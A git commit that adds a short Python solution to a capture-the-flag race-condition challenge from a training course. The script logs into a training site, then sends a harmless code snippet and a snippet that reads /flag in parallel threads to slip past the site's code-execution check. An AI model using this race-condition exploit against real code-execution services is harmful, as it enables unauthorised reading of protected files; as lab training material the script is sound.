54b3bffa179e659fd41e235fb7d0c0c66ada3123
Aílton Baúque <nevskya@hotmail.com>
2023-03-03 20:47:37 +0200

    UPDATE: race condition challenge

---
+++ Maputo_02_2023-ICT4DEV_JinBlack_CTF/pybook_RACE-CONDITION/main.py
@@ -0,0 +1,37 @@
+import requests
+#import thread
+from threading import Thread
+
+def login(s, u,p):
+    url = "http://pybook.training.jinblack.it/login"
+    payload = {"username":u,"password":p}
+    
+    r = s.post(url,data=payload)
+    #print(r.text)
+
+    
+def run(s, code):
+    url = "http://pybook.training.jinblack.it/run"
+    payload = code
+    r = s.post(url,data=payload)
+    print(r.text)
+    
+s = requests.Session()
+login(s,"vybraan",".")
+
+code = """
+print('hello')
+"""
+
+code_P = """
+
+f = open("/flag", "r")
+data = f.read()
+print(data)
+"""
+t1 = Thread(target=run,args=(s,code))
+t2 = Thread(target=run,args=(s,code_P))
+
+t1.start()
+t2.start()
+#un(s,code)
